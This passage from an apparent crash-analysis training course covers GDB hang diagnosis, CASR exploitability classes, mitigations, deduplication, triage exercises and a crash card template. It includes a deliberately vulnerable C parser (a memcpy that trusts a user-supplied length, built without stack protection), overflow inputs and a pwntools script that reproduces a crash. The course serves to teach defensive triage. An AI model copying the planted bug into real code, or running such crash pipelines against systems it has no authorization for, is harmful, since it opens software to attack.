cd ~/crash_analysis_lab

# Create multiple hang inputs
echo "LOOPA" > crashes/hang_a1.txt
echo "LOOPA" > crashes/hang_a2.txt
echo "LOOPB" > crashes/hang_b1.txt
echo "LOOPC" > crashes/hang_c1.txt

# Run bucketing
chmod +x bucket_hangs.sh
./bucket_hangs.sh
```

#### Infinite Loop Detection Patterns

When analyzing hangs interactively, GDB helps identify the specific loop pattern. The key is distinguishing between a program **waiting for input** (blocked in `read()`) versus an **actual infinite loop** (spinning CPU).

**Common Mistake: Blocking vs Spinning**

```bash
cd ~/crash_analysis_lab

# WRONG: Running without input - program blocks waiting for stdin
gdb ./hang_test
(gdb) run 2
# Press Ctrl+C...
# You'll see it's blocked in read(), NOT in an infinite loop:
#   #0  __GI___libc_read () at read.c:26
#   #1  _IO_file_underflow ()
#   #5  fgets ()
#   #6  main () at src/hang_test.c:69   <-- Waiting for input!
# This is NOT a hang - it's waiting for you to type something
```

**Correct Approach: Provide Input First**

```bash
cd ~/crash_analysis_lab

# Method 1: Use a pipe to provide input, then attach
echo "LOOP" | ./hang_test 2 &
HANG_PID=$!
sleep 0.5  # Let it enter the loop

# Now attach and analyze
sudo gdb -batch -p $HANG_PID \
    -ex "bt" \
    -ex "x/5i \$pc" \
    -ex "detach" 2>&1

# Expected output shows we're IN the loop, not waiting for input:
#   #0  0x0000555555555375 in process_command (cmd=...) at src/hang_test.c:36
#   #1  0x000055555555551e in main () at src/hang_test.c:70
#
#   => 0x555555555375 <process_command+221>:  nop
#      0x555555555376 <process_command+222>:  jmp 0x555555555375
#
# The jmp-to-itself pattern confirms an infinite loop!

kill $HANG_PID 2>/dev/null

# Method 2: Interactive GDB with input redirection
# First ensure the input file exists (created earlier in this section):
echo "LOOP" > crashes/hang_input.txt

gdb ./hang_test
(gdb) run 2 < crashes/hang_input.txt
# Now Ctrl+C will catch it in the actual loop
^C
(gdb) bt
# #0  process_command (cmd=0x7fffffffdfd0 "LOOP\n") at src/hang_test.c:36
# #1  main () at src/hang_test.c:70
```

**Distinguishing Hang Types**:

```bash
cd ~/crash_analysis_lab

# 1. Blocked on I/O (NOT a bug - waiting for input)
gdb ./hang_test
(gdb) run 2
^C
(gdb) bt
# Shows: read() -> fgets() -> main()
# PC is in libc read(), program is WAITING not SPINNING
(gdb) info proc status
# CPU time will be near zero - not consuming CPU

# 2. True infinite loop (BUG - spinning CPU)
echo "LOOP" | ./hang_test 2 &
PID=$!; sleep 1
sudo gdb -batch -p $PID -ex "info proc status" 2>&1 | grep -E "utime|stime"
# Shows high CPU time - actively spinning
kill $PID

# 3. Mutex deadlock (multithreaded programs)
# Would show multiple threads in __lll_lock_wait
(gdb) info threads
# Thread 1: __lll_lock_wait()  <- waiting for lock
# Thread 2: __lll_lock_wait()  <- also waiting = DEADLOCK
```

**Testing Different Loop Patterns**:

```bash
cd ~/crash_analysis_lab

# Each LOOP variant creates a loop at a different source line
# This tests whether your deduplication correctly groups them

for pattern in LOOPA LOOPB LOOPC LOOP; do
    echo "=== Testing $pattern ==="
    echo "$pattern" | ./hang_test 2 &
    PID=$!
    sleep 0.3

    # Get the crash location
    sudo gdb -batch -p $PID -ex "bt 2" 2>&1 | grep "process_command"

    kill $PID 2>/dev/null
    wait $PID 2>/dev/null
done

# Output shows different line numbers but same function:
#   process_command at src/hang_test.c:23  (LOOPA)
#   process_command at src/hang_test.c:27  (LOOPB)
#   process_command at src/hang_test.c:32  (LOOPC)
#   process_command at src/hang_test.c:36  (LOOP)
```

**Identifying Algorithmic Hangs vs Infinite Loops**:

```bash
cd ~/crash_analysis_lab

# Algorithmic hang (O(n²) with usleep - gets very slow with large input)
time timeout 5s ./hang_test 1 $(python3 -c "print('A'*100)")
# Completes in ~1-2 seconds
# real    0m1.6s
# user    0m0.05s   <- Low CPU (usleep dominates)

time timeout 30s ./hang_test 1 $(python3 -c "print('A'*500)")
# Times out! 500 chars = 25x more iterations than 100 chars (O(n²))
# Would need ~40+ seconds to complete

# True infinite loop (never completes, high CPU)
echo "LOOP" | timeout 5s ./hang_test 2
# Always killed by timeout, prints "[*] Entering default loop..."

# Key differences when debugging:
# - Algorithmic: PC changes on each Ctrl+C, low-ish CPU if I/O bound
# - Infinite loop: PC stays at same instruction (jmp to itself), 100% CPU
# - I/O blocked: PC in read()/recv(), near-zero CPU
```

#### Algorithmic Complexity Attack Detection

```bash
cd ~/crash_analysis_lab

# Test O(n²) behavior with increasing input sizes
echo "Testing algorithmic complexity..."

for size in 100 200 400 800; do
    input=$(python3 -c "print('A'*$size)")
    echo -n "Size $size: "
    time timeout 30s ./hang_test 1 "$input" 2>/dev/null
done

# You'll see execution time grow quadratically:
# Size 100: ~1 second
# Size 200: ~6 seconds
# Size 400: ~24 seconds
# Size 800: timeout (would be >64 seconds)
```

### CASR Severity Classes

CASR classifies crashes into three main categories with 23 specific types:

**EXPLOITABLE (High Severity)**:

1. **SegFaultOnPc**: Instruction pointer controlled by attacker

   ```json
   "ShortDescription": "SegFaultOnPc"
   // PC/IP register contains attacker-controlled value
   ```

2. **ReturnAv**: Return address overwrite

   ```json
   "ShortDescription": "ReturnAv"
   // Return address corrupted, likely stack overflow
   ```

3. **BranchAv**: Branch target controlled

   ```json
   "ShortDescription": "BranchAv"
   // Indirect jump/call to attacker-controlled address
   ```

4. **CallAv**: Call instruction with controlled target

   ```json
   "ShortDescription": "CallAv"
   // Function pointer or vtable corruption
   ```

5. **DestAv**: Write-what-where primitive

   ```json
   "ShortDescription": "DestAv"
   // Can write to arbitrary address
   ```

6. **heap-buffer-overflow-write**: Heap write overflow
   ```json
   "ShortDescription": "heap-buffer-overflow-write"
   // Writing past heap allocation boundary
   ```

**PROBABLY_EXPLOITABLE (Medium Severity)**:

7. **SourceAv**: Read from controlled address

   ```json
   "ShortDescription": "SourceAv"
   // Information leak primitive
   ```

8. **BadInstruction**: Invalid opcode execution

   ```json
   "ShortDescription": "BadInstruction"
   // May indicate code corruption
   ```

9. **heap-use-after-free-write**: UAF write access

   ```json
   "ShortDescription": "heap-use-after-free-write"
   // Write to freed memory
   ```

10. **double-free**: Double free corruption

    ```json
    "ShortDescription": "double-free"
    // Heap metadata corruption
    ```

11. **stack-buffer-overflow**: Stack corruption

    ```json
    "ShortDescription": "stack-buffer-overflow"
    // Stack overflow (may be mitigated by canaries)
    ```

12. **heap-buffer-overflow**: Heap read overflow
    ```json
    "ShortDescription": "heap-buffer-overflow"
    // Reading past allocation (info leak)
    ```

**NOT_EXPLOITABLE (Low Severity)**:

13. **AbortSignal**: Intentional abort

    ```json
    "ShortDescription": "AbortSignal"
    // assert() or abort() triggered
    ```

14. **null-deref**: NULL pointer dereference

    ```json
    "ShortDescription": "null-deref"
    // Accessing NULL (usually DoS only)
    ```

15. **SafeFunctionCheck**: Security check triggered
    ```json
    "ShortDescription": "SafeFunctionCheck"
    // Stack canary, vtable guard, etc.
    ```

**Additional Severity Types**:

- **stack-use-after-return**: Stack address used after return
- **stack-use-after-scope**: Stack variable used after scope
- **heap-use-after-free**: UAF read
- **global-buffer-overflow**: Global array overflow
- **container-overflow**: STL container bounds violation
- **initialization-order-fiasco**: Static init race
- **alloc-dealloc-mismatch**: new/delete mismatch
- **signal**: Uncaught signal (SIGABRT, SIGFPE, etc.)

#### Example CASR Report

Here's an actual CASR report from analyzing a stack buffer overflow:

```json
{
  "Date": "2026-01-08T11:24:48.290204+00:00",
  "Uname": "Linux os 6.8.0-90-generic #91-Ubuntu SMP ...",
  "OS": "Ubuntu",
  "OSRelease": "24.04",
  "Architecture": "amd64",
  "ExecutablePath": "./vuln_asan",
  "ProcCmdline": "./vuln_asan 1 AAAAAAAAAA...(200 chars)",
  "CrashSeverity": {
    "Type": "EXPLOITABLE",
    "ShortDescription": "stack-buffer-overflow(write)",
    "Description": "Stack buffer overflow",
    "Explanation": "The target writes data past the end, or before the beginning, of the intended stack buffer."
  },
  "Stacktrace": [
    "    #0 0x555555602d73 in strcpy (/home/dev/crash_analysis_lab/vuln_asan+0xaed73)",
    "    #1 0x555555659c75 in stack_overflow /home/dev/crash_analysis_lab/src/vulnerable_suite.c:9:5",
    "    #2 0x555555659c75 in main /home/dev/crash_analysis_lab/src/vulnerable_suite.c:65:39",
    "    #3 0x7ffff7c2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16",
    "    #4 0x7ffff7c2a28a in __libc_start_main csu/../csu/libc-start.c:360:3",
    "    #5 0x555555580344 in _start (/home/dev/crash_analysis_lab/vuln_asan+0x2c344)"
  ],
  "CrashLine": "/home/dev/crash_analysis_lab/src/vulnerable_suite.c:9:5",
  "Source": [
    "    5      // 1. Stack Buffer Overflow",
    "    6      void stack_overflow(char *input) {",
    "    7          char buffer[64];",
    "    8          printf(\"[*] Copying input to 64-byte buffer...\\n\");",
    "--->9          strcpy(buffer, input);  // No bounds check!",
    "    10         printf(\"[*] Buffer: %s\\n\", buffer);",
    "    11     }"
  ],
  "AsanReport": [
    "==234082==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffff5e00060 at pc 0x555555602d74 bp 0x7fffffffdf70 sp 0x7fffffffd728",
    "WRITE of size 201 at 0x7ffff5e00060 thread T0",
    "    #0 0x555555602d73 in strcpy ...",
    "    #1 0x555555659c75 in stack_overflow vulnerable_suite.c:9:5",
    "",
    "Address 0x7ffff5e00060 is located in stack of thread T0 at offset 96 in frame",
    "    #0 0x555555659a7f in main vulnerable_suite.c:60",
    "",
    "  This frame has 1 object(s):",
    "    [32, 96) 'buffer.i' (line 7) <== Memory access at offset 96 overflows this variable",
    "",
    "Shadow bytes around the buggy address:",
    "=>0x7ffff5e00000: f1 f1 f1 f1 00 00 00 00 00 00 00 00[f3]f3 f3 f3",
    "Shadow byte legend:",
    "  Stack left redzone:      f1",
    "  Stack right redzone:     f3",
    "  Addressable:             00",
    "SUMMARY: AddressSanitizer: stack-buffer-overflow in strcpy"
  ]
}
```

**Key Fields Explained**:

- **CrashSeverity.Type**: EXPLOITABLE / PROBABLY_EXPLOITABLE / NOT_EXPLOITABLE
- **CrashSeverity.ShortDescription**: Specific bug class (e.g., `stack-buffer-overflow(write)`)
- **Stacktrace**: Full call stack with source locations (when symbols available)
- **CrashLine**: Exact source file and line where crash occurred
- **Source**: Context lines around the crash (with `--->` marking the crash line)
- **AsanReport**: Complete ASAN output including shadow memory visualization

### Mitigation Context

When assessing exploitability, you must understand which mitigations are active. Modern systems have multiple layers of protection that affect whether a crash is weaponizable.

**Checking Mitigations on Linux**:

```bash
# Using checksec (from pwntools or standalone)
checksec --file=./target

# Output:
# RELRO:           Full RELRO
# Stack:           Canary found
# NX:              NX enabled
# PIE:             PIE enabled
# FORTIFY:         Enabled

# Check system-wide ASLR
cat /proc/sys/kernel/randomize_va_space
# 0 = disabled, 1 = conservative, 2 = full

# Check kernel protection features
cat /sys/devices/system/cpu/vulnerabilities/*
```

**Checking Mitigations on Windows**:

```bash
# Using Process Explorer or Task Manager → Details → Right-click columns
# Add: DEP, ASLR, CFG, CET Shadow Stack

# PowerShell check
Get-ProcessMitigation -Name target.exe

# WinDbg check
!dh -f target
# Look for: DYNAMIC_BASE, NX_COMPAT, GUARD_CF, CETCOMPAT
```

**Modern Mitigation Impact on Exploitability**:

| Mitigation           | What It Prevents                    | Bypass Complexity             | Deployment Status             |
| -------------------- | ----------------------------------- | ----------------------------- | ----------------------------- |
| **Stack Canaries**   | Stack buffer overflow → RIP control | Medium (info leak required)   | Universal                     |
| **NX/DEP**           | Execute shellcode on stack/heap     | Medium (ROP/JOP required)     | Universal                     |
| **ASLR/PIE**         | Hardcoded addresses in exploits     | Medium (info leak required)   | Universal                     |
| **RELRO**            | GOT overwrite                       | Full RELRO: High              | Common (Full in hardened)     |
| **CFG/CFI**          | Arbitrary indirect calls            | High (gadget constraints)     | Windows default, Linux opt-in |
| **CET Shadow Stack** | ROP attacks                         | Very High (hardware enforced) | Windows 11+, Chrome, Edge     |
| **CET IBT**          | JOP/COP attacks                     | Very High (hardware enforced) | Emerging (Linux 6.2+)         |
| **ARM PAC**          | Pointer corruption                  | High (key required)           | Apple Silicon, Android 12+    |
| **ARM BTI**          | Branch to arbitrary code            | High (landing pads required)  | ARMv8.5+, iOS/Android         |
| **ARM MTE**          | Spatial/temporal memory bugs        | High (tag bypass required)    | Pixel 8+, select ARM servers  |

**CET (Control-flow Enforcement Technology)**:

Intel CET is a game-changer for exploitability assessment. Available on 11th Gen+ Intel and AMD Zen 3+:

```bash
# Check if binary is CET-enabled
readelf -n target | grep -i shstk
# Or check for GNU_PROPERTY_X86_FEATURE_1_SHSTK

# In crash analysis, CET-enabled crashes with RIP control may be:
# - NOT EXPLOITABLE if CET shadow stack is enforced
# - Still exploitable via non-control-flow primitives (data-only attacks)
```

**ARM Pointer Authentication (PAC)**:

On Apple Silicon and ARMv8.3+ systems:

```bash
# Check for PAC in binary
otool -l binary | grep -A5 LC_BUILD_VERSION
# Look for: platform 6 (macOS with PAC)

# PAC-protected pointers have signatures in upper bits
# Crash analysis must account for PAC failures vs actual bugs
```

**Exploitability Assessment Update**:

When documenting crashes, always include mitigation context:

```markdown
## Exploitability Assessment

**Crash Type**: Stack Buffer Overflow (RIP control)
**Traditional Rating**: EXPLOITABLE

### Mitigation Analysis

- Stack Canary: Present (bypassed via info leak in CVE-XXXX)
- NX: Enabled (ROP required)
- ASLR: Enabled (info leak in same bug provides base)
- CET: NOT enabled (legacy binary)
- CFG: NOT enabled

**Adjusted Rating**: EXPLOITABLE (with caveats)
**Exploitation Complexity**: Medium
**Required Primitives**: Info leak (available), ROP chain

> [!NOTE]
> On CET-enabled systems, this would be NOT EXPLOITABLE
> via traditional ROP. Data-only exploitation would need assessment.
```

**Key Questions for Exploitability**:

1. Is CET/PAC enabled? If yes, ROP/JOP may be blocked
2. Is CFG/CFI present? Limits callable targets
3. Is the binary sandboxed? (Chrome, iOS apps)
4. What's the deployment context? (kernel, hypervisor, user-space)
5. Are there adjacent info leak primitives?

### Microsoft !exploitable (Windows)

**What It Does**:

- WinDbg extension for exploitability analysis
- Similar to GDB exploitable
- Classifies Windows crashes
- Essential for Windows fuzzing

**Installation**:

```bash
# Download MSEC.dll from GitHub (community-maintained build):
# https://github.com/gr4ysku11/MSECExtensions/releases
# Download: MSEC.dll_x64 (for 64-bit) or MSEC.dll_x86 (for 32-bit)

# Rename and copy to WinDbg extensions folder:
# For 64-bit:
ren MSEC.dll_x64 MSEC.dll
copy MSEC.dll "C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\winext\"

# For 32-bit:
ren MSEC.dll_x86 MSEC.dll
copy MSEC.dll "C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\winext\"

# Verify installation in WinDbg:
.load msec
!exploitable -help

# Or specify full path if not in winext folder:
.load C:\path\to\MSEC.dll
```

> [!NOTE]
> The original Microsoft download (download ID 44445) is no longer available.
> The community-maintained build at the GitHub repository above provides the same functionality.

**Usage**:

```bash
# In WinDbg with loaded crash dump
!exploitable

# Output:
# Exploitability Classification: EXPLOITABLE
# Recommended Bug Title: Exploitable - User Mode Write AV (0x3caef4c0)
#
# The target crashed attempting to write to an address that is
# accessible to user mode code. This type of access violation is
# often exploitable.
```

**Automated Batch Analysis** (PowerShell):

```powershell
# Path to cdb.exe (adjust if needed)
$cdb = "C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\cdb.exe"

# Analyze all crash dumps
$crashes = Get-ChildItem .\crashes\ -Filter *.dmp

foreach ($crash in $crashes) {
    $output = & $cdb -z $crash.FullName `
        -c ".load msec; !exploitable; q" `
        2>&1 | Out-String

    $output | Out-File "analysis_$($crash.BaseName).txt"

    if ($output -match "Exploitability Classification: (\w+)") {
        Write-Host "$($crash.Name): $($Matches[1])"
    }
}
```

**Command-Line Quick Analysis**:

```batch
REM Single dump analysis with !exploitable
set CDB="C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\cdb.exe"
%CDB% -z crash.dmp -c ".load msec; !analyze -v; !exploitable; q"
```

### Crash Deduplication Strategies

**Why Deduplication Matters**:

- Fuzzing generates thousands of crashes
- Many crashes are duplicates (same root cause)
- Need to focus on unique bugs
- Reduces manual analysis workload

**Deduplication Methods**:

**1. Stack Hash**:

```bash
# Hash based on call stack
# Pro: Fast, deterministic
# Con: Different stacks can be same bug

# Example with GDB
gdb -batch \
    -ex "run < crash" \
    -ex "bt" \
    -ex "quit" \
    ./target 2>&1 | md5sum
```

**2. Coverage Hash**:

```bash
# Hash based on code coverage path
# Pro: Captures execution flow
# Con: Requires instrumentation

# Example with afl-showmap (requires AFL instrumentation)
# File-input targets (using @@):
afl-showmap -q -e -o /tmp/cov.map -H crash -- ./target_afl @@ || true
md5sum /tmp/cov.map
```

**3. Exploitable Hash**:

```bash
# Hash from exploitable plugin
# Pro: Semantically meaningful
# Con: Slower, requires debugging

# Automatically provided by exploitable plugin
(gdb) exploitable
# Hash: 0x123456789abcdef
```

**4. ASAn Report Hash**:

```bash
# Hash ASAN report (excluding addresses)
# Pro: Very accurate for ASAN crashes
# Con: Requires ASAN build

./target_asan < crash 2>&1 | \
    sed 's/0x[0-9a-f]\{8,\}/0xXXX/g' | \
    md5sum
```

### Combining Tools for Best Results

**Recommended Workflow**:

1. **AFL++ Fuzzing**: Generate crashes with coverage-guided fuzzing
2. **CASR triage**: Initial deduplication and classification
3. **ASAN Analysis**: Detailed classification of unique crashes
4. **CASR Clustering**: Group similar bugs together
5. **Manual Review**: Verify high-priority crashes
6. **Exploit Development**: Focus on EXPLOITABLE crashes

### Practical Exercise

**Task**: Triage 20 AFL++ crashes using CASR and automated tools

> [!TIP]
> If you completed Week 2 fuzzing exercises (libWebP, GStreamer, json-c, or your own targets), use those real crashes here. The workflow is more meaningful with crashes you generated yourself.

#### Setup

```bash
cd ~/crash_analysis_lab
mkdir -p afl_triage/{casrep,clusters,priority}

# Option 1: Use crashes from Week 2 fuzzing
# cp -r ~/week2_fuzzing/afl_output/default/crashes ./afl_triage/crashes

# Option 2: Use the fuzz_target from earlier in Day 3
# (If you ran the AFL++ example in "AFL++ Fuzzing to CASR Triage" section)
# cp -r afl_output/default/crashes ./afl_triage/crashes

# Option 3: Generate fresh crashes with the Day 1 test suite
mkdir -p afl_triage/crashes
for i in {1..5}; do
    python3 -c "print('A' * (100 + $i * 20))" > afl_triage/crashes/stack_$i
done
for i in {1..5}; do
    python3 -c "print('B' * (50 + $i * 10))" > afl_triage/crashes/heap_$i
done
# Add UAF, double-free, null-deref triggers
echo "3" > afl_triage/crashes/uaf_1
echo "4" > afl_triage/crashes/df_1
echo "5 0" > afl_triage/crashes/null_1
```

#### Step 1: Generate CASR Reports

```bash
cd ~/crash_analysis_lab

# For file-input targets (using @@ placeholder):
# casr-afl -i afl_triage/crashes -o afl_triage/casrep -j 4 -- ./bin/fuzz_target_asan @@

# For the Day 1 test suite (stdin-based, different test numbers):
for crash in afl_triage/crashes/*; do
    name=$(basename "$crash")

    # Determine test type from filename
    if [[ "$name" == stack_* ]]; then
        casr-san -o "afl_triage/casrep/${name}.casrep" -- ./vuln_asan 1 "$(cat $crash)" 2>/dev/null
    elif [[ "$name" == heap_* ]]; then
        casr-san -o "afl_triage/casrep/${name}.casrep" -- ./vuln_asan 2 "$(cat $crash)" 2>/dev/null
    elif [[ "$name" == uaf_* ]]; then
        casr-san -o "afl_triage/casrep/${name}.casrep" -- ./vuln_asan 3 2>/dev/null
    elif [[ "$name" == df_* ]]; then
        casr-san -o "afl_triage/casrep/${name}.casrep" -- ./vuln_asan 4 2>/dev/null
    elif [[ "$name" == null_* ]]; then
        casr-san -o "afl_triage/casrep/${name}.casrep" -- ./vuln_asan 5 0 2>/dev/null
    fi
done

# Verify reports were generated
ls -la afl_triage/casrep/
```

#### Step 2: Cluster Similar Crashes

```bash
# Cluster CASR reports by crash signature
casr-cluster -c afl_triage/casrep/ afl_triage/clusters/

# View cluster summary
echo "=== Cluster Summary ==="
for cluster in afl_triage/clusters/cl*; do
    count=$(ls -1 "$cluster"/*.casrep 2>/dev/null | wc -l)
    # Get crash type from first report in cluster
    first_report=$(ls "$cluster"/*.casrep 2>/dev/null | head -1)
    if [ -n "$first_report" ]; then
        crash_type=$(jq -r '.CrashSeverity.ShortDescription' "$first_report" 2>/dev/null)
        severity=$(jq -r '.CrashSeverity.Type' "$first_report" 2>/dev/null)
        echo "$(basename $cluster): $count crashes - $crash_type ($severity)"
    fi
done
```

#### Step 3: Prioritize by Exploitability

```bash
# Extract EXPLOITABLE crashes to priority directory
mkdir -p afl_triage/priority

for casrep in afl_triage/casrep/*.casrep; do
    severity=$(jq -r '.CrashSeverity.Type' "$casrep" 2>/dev/null)
    if [ "$severity" = "EXPLOITABLE" ]; then
        cp "$casrep" afl_triage/priority/
        echo "[EXPLOITABLE] $(basename $casrep)"
    elif [ "$severity" = "PROBABLY_EXPLOITABLE" ]; then
        echo "[PROBABLY_EXPLOITABLE] $(basename $casrep)"
    fi
done

echo ""
echo "Priority crashes: $(ls -1 afl_triage/priority/*.casrep 2>/dev/null | wc -l)"
```

#### Step 4: Interactive Review with casr-cli

```bash
# Browse all reports interactively
casr-cli afl_triage/casrep/

# Or view clustered results
casr-cli afl_triage/clusters/

# Generate SARIF report for CI/CD integration
casr-cli --sarif afl_triage/triage_report.sarif afl_triage/casrep/
```

#### Step 5: Document Findings

Create a triage report following this template:

```markdown
# Crash Triage Report

**Date**: [Date]
**Target**: vuln_asan (Day 1 test suite)
**Total Crashes Analyzed**: 12

## Summary

| Severity             | Count |
| -------------------- | ----- |
| EXPLOITABLE          | 5     |
| PROBABLY_EXPLOITABLE | 3     |
| NOT_EXPLOITABLE      | 4     |

## Unique Bug Classes (Clusters)

| Cluster | Type                  | Count | Priority |
| ------- | --------------------- | ----- | -------- |
| cl0     | stack-buffer-overflow | 5     | HIGH     |
| cl1     | heap-buffer-overflow  | 3     | HIGH     |
| cl2     | heap-use-after-free   | 1     | HIGH     |
| cl3     | double-free           | 1     | MEDIUM   |
| cl4     | null-dereference      | 2     | LOW      |

## Priority Crashes (EXPLOITABLE)

### 1. Stack Buffer Overflow (stack_5)

- **Type**: stack-buffer-overflow(write)
- **Location**: vulnerable_suite.c:9
- **Description**: WRITE of size 221 past stack buffer
- **Exploitability**: RIP control via return address overwrite

### 2. Heap Buffer Overflow (heap_5)

- **Type**: heap-buffer-overflow(write)
- **Location**: vulnerable_suite.c:16
- **Description**: WRITE of size 101 past 32-byte heap allocation
- **Exploitability**: Heap metadata corruption, potential arbitrary write

## Recommendations

1. Fix stack_overflow() - add bounds checking before strcpy
2. Fix heap_overflow() - validate input length before memcpy
3. Fix use_after_free() - null pointer after free
```

#### Success Criteria

- [ ] All crashes processed through CASR
- [ ] Crashes clustered by unique root cause
- [ ] EXPLOITABLE crashes identified and prioritized
- [ ] Triage report generated with actionable findings
- [ ] Understand the difference between crash count and unique bug count

### Exercise: Black-Box Stripped Binary Analysis

In the real world, you often analyze crashes in binaries without symbols or source code. This exercise forces you to do crash analysis using only primitive tools.

#### Setup

```bash
cd ~/crash_analysis_lab

# Create a stripped vulnerable binary
cat > src/parser_stripped.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void parse_packet(char* input) {
    char cmd[8], data[64];
    int len;

    strncpy(cmd, input, 3);
    cmd[3] = '\0';
    char* p = input + 4;
    len = atoi(p);
    while (*p && *p != ':') p++;
    if (*p) p++;
    memcpy(data, p, len);  // BUG: trusts user-provided length
    printf("Cmd: %s, Len: %d\n", cmd, len);
}

int main() {
    char buf[256];
    if (fgets(buf, sizeof(buf), stdin)) parse_packet(buf);
    return 0;
}
EOF

# Compile and strip
gcc -O2 -fno-stack-protector -no-pie src/parser_stripped.c -o parser_stripped
strip --strip-all parser_stripped

# Create crash input
echo "CMD:200:$(python3 -c 'print("A"*200)')" > crashes/stripped_crash.bin

# Verify crash
./parser_stripped < crashes/stripped_crash.bin
# Segmentation fault
```

#### Your Task

Analyze the crash **without source code or symbols**. Use only:

- `gdb` / `pwndbg` for debugging
- `checksec` for mitigations
- `objdump` / `readelf` for binary info

**Hints** (use these Pwndbg commands):

```bash
gdb ./parser_stripped
(gdb) run < crashes/stripped_crash.bin

# After crash:
pwndbg> vmmap                    # Memory layout
pwndbg> telescope $rsp 30        # Stack contents
pwndbg> search "AAAA"            # Find input pattern
pwndbg> x/20i $rip-40            # Disassemble crash area
pwndbg> checksec                 # Binary protections
```

#### Deliverable

Write a **1-page report** answering:

1. What signal/crash type occurred?
2. What instruction caused the crash?
3. Which registers contain attacker-controlled data?
4. What's the likely vulnerability type?
5. Is it exploitable? Why/why not?

**Success Criteria**:

- [ ] Crash type correctly identified without symbols
- [ ] Attacker-controlled data located in memory/registers
- [ ] Reasonable exploitation assessment provided

### Exercise: Realistic Corpus Pipeline (Week 2 → Week 4)

It connects fuzzing (Week 2) to crash analysis (Week 4) and PoC development. Use AFL++ output if available.

#### Pipeline Overview

```text
AFL++ crashes → casr-afl → casr-cluster → afl-tmin → PoC script
```

#### Your Task

Complete the full pipeline from raw crashes to a working PoC:

**Step 1: Gather Crashes**

```bash
# Option A: Use your Week 2 fuzzing output
ls ~/week2_fuzzing/afl_output/default/crashes/

# Option B: Use the fuzz_target crashes from earlier today
ls ~/crash_analysis_lab/afl_output/default/crashes/

# Option C: Generate test crashes (if no fuzzing output available)
# Use the Day 1 test suite to create sample crashes
```

**Step 2: Triage with CASR**

```bash
# For file-input targets:
casr-afl -i crashes/ -o casrep/ -j 4 -- ./target_asan @@

# Cluster results:
casr-cluster -c casrep/ clusters/

# Review:
casr-cli clusters/
```

**Step 3: Minimize Top Crash**

```bash
# Pick EXPLOITABLE crash from highest-priority cluster
afl-tmin -i crash_file -o minimized.bin -m none -- ./target @@
```

**Step 4: Write PoC**

```python
#!/usr/bin/env python3
from pwn import *

PAYLOAD = open("minimized.bin", "rb").read()

def test_crash():
    p = process(["./target"])
    p.send(PAYLOAD)
    try:
        p.wait(timeout=2)
    except:
        pass
    if p.returncode and p.returncode < 0:
        log.success(f"Crash confirmed! Signal: {-p.returncode}")
        return True
    return False

if __name__ == "__main__":
    test_crash()
```

#### Deliverable

A short report documenting:

1. **Input**: How many crashes, from what target
2. **Triage**: EXPLOITABLE/PROBABLY_EXPLOITABLE/NOT_EXPLOITABLE counts
3. **Clusters**: How many unique bugs found
4. **Selected crash**: Which one and why
5. **Minimization**: Original vs minimized size
6. **PoC**: Does it reliably trigger the crash?

**Success Criteria**:

- [ ] Completed full pipeline: triage → cluster → minimize → PoC
- [ ] PoC reliably triggers crash (≥9/10 attempts)
- [ ] Time spent documented (target: <1 hour for 20 crashes)

### Standardized Triage Notes: The Crash Card

This one-page document captures everything needed to understand, reproduce, and prioritize the bug. It becomes your deliverable for professional crash analysis.

#### Crash Card Template

````markdown
# Crash Card: [Brief Description]

**ID**: [Unique identifier, e.g., CRASH-2024-001]
**Date**: [Analysis date]
**Analyst**: [Your name]
**Target**: [Binary name and version]

## Crash Signature

- **Signal**: [SIGSEGV/SIGABRT/etc.]
- **Exception Code**: [0xc0000005/etc. for Windows]
- **Faulting Instruction**: [e.g., mov [rax], rcx]
- **Faulting Address**: [e.g., 0x4141414141414141]
- **Stack Hash**: [First 8 chars of stack trace hash]

## Primitive Classification

- **Type**: [ ] Read [ ] Write [ ] Execute [ ] Control-flow
- **CASR Severity**: [EXPLOITABLE/PROBABLY_EXPLOITABLE/NOT_EXPLOITABLE]
- **Specific Class**: [heap-buffer-overflow/use-after-free/etc.]

## Attacker Control Assessment

| Element        | Controlled?     | Evidence            |
| -------------- | --------------- | ------------------- |
| Crash address  | Yes/No/Partial  | [How you know]      |
| Written value  | Yes/No/Partial  | [How you know]      |
| Size of access | Yes/No/Partial  | [How you know]      |
| Path to crash  | Direct/Indirect | [Input correlation] |

## Reachability Analysis

- **Input Vector**: [stdin/file/network/IPC]
- **Authentication Required**: [Yes/No]
- **User Interaction**: [Yes/No]
- **Attack Complexity**: [Low/Medium/High]

**Data Flow Summary**:
[Input source] → [Parser/Handler] → [Vulnerable operation] → [Crash]

## Active Mitigations

| Mitigation   | Status            | Bypass Complexity    |
| ------------ | ----------------- | -------------------- |
| ASLR/PIE     | On/Off            | [Low/Med/High/N/A]   |
| Stack Canary | On/Off            | [Requires info leak] |
| NX/DEP       | On/Off            | [ROP required]       |
| RELRO        | None/Partial/Full | [GOT writable?]      |
| CFG/CFI      | On/Off            | [Gadget constraints] |
| CET          | On/Off            | [Hardware enforced]  |

## Reproduction

- **Minimized Input**: [filename or hash]
- **Input Size**: [X bytes]
- **SHA256**: [hash of minimized input]
- **Reproduction Rate**: [X/10 attempts]

**Reproduction Command**:

```bash
./target < crash_input.bin
```

## Recommended Priority

- [ ] **CRITICAL**: Remote code execution, no auth, easy trigger
- [ ] **HIGH**: Code execution with constraints
- [ ] **MEDIUM**: Info leak or DoS
- [ ] **LOW**: Hard to reach or limited impact

**Justification**: [1-2 sentences explaining priority]

## Raw Data

<details>
<summary>ASAN Report (click to expand)</summary>

```
[Paste ASAN output here]
```

</details>

<details>
<summary>Backtrace</summary>

```
[Paste GDB backtrace here]
```

</details>
````

#### Example Filled-In Crash Card

````markdown
# Crash Card: Heap Overflow in JSON Parser

**ID**: CRASH-2024-042
**Date**: 2024-12-19
**Analyst**: Security Researcher
**Target**: json_parser v2.1.0 (Linux x86_64)

## Crash Signature

- **Signal**: SIGSEGV (11)
- **Faulting Instruction**: `mov byte ptr [rdi+rax], cl`
- **Faulting Address**: 0x6070000000a0 (heap)
- **Stack Hash**: 8f3a2b1c

## Primitive Classification

- **Type**: [X] Write
- **CASR Severity**: EXPLOITABLE
- **Specific Class**: heap-buffer-overflow-write

## Attacker Control Assessment

